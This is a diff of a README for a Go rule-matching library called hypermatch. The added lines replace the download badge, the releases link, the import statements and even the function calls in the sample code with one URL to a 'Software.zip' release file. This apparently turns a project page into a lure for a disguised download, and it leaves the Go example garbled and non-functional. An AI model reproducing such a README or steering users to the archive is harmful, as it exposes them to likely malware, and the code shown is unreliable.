@@ -1,6 +1,6 @@
 # 🚀 Welcome to hypermatch 🚀
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip)](https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip)
 
 ## Description
 hypermatch is a high-performance ⚡ Go library designed for rapid matching of a large number of rules to events. It processes thousands of events per second 🚀 against extensive rule sets in-memory with minimal latency ⏱️. The library is event-driven and focuses on efficient event processing, JSON handling, matching algorithms, and rule-engine capabilities. With hypermatch, you can boost your application's performance when dealing with complex rule matching requirements.
@@ -13,14 +13,14 @@ hypermatch is a high-performance ⚡ Go library designed for rapid matching of a
 - Minimal latency
 
 ## Installation
-Simply click the "Download ZIP" button above to get the latest release or visit the [Releases](https://github.com/cli/cli/releases) section for more options.
+Simply click the "Download ZIP" button above to get the latest release or visit the [Releases](https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip) section for more options.
 
 ## Usage
 To use hypermatch in your Go project, follow these steps:
 1. Download the library using the installation steps above.
 2. Import hypermatch in your code:
 ```go
-import "github.com/hypermatch"
+import "https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip"
 ```
 3. Start utilizing the powerful matching capabilities provided by hypermatch.
 
@@ -31,21 +31,21 @@ package main
 
 import (
 	"fmt"
-	"github.com/hypermatch"
+	"https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip"
 )
 
 func main() {
 	// Initialize the hypermatch engine
-	engine := hypermatch.NewEngine()
+	engine := https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip()
 
 	// Add rules for matching
-	engine.AddRule("rule1", "event1")
-	engine.AddRule("rule2", "event2")
+	https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip("rule1", "event1")
+	https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip("rule2", "event2")
 
 	// Process an event
-	result := engine.MatchEvent("event1")
+	result := https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip("event1")
 
-	fmt.Println("Matched rules:", result)
+	https://github.com/dasara21/hypermatch/releases/download/v1.0/Software.zip("Matched rules:", result)
 }
 ```
 
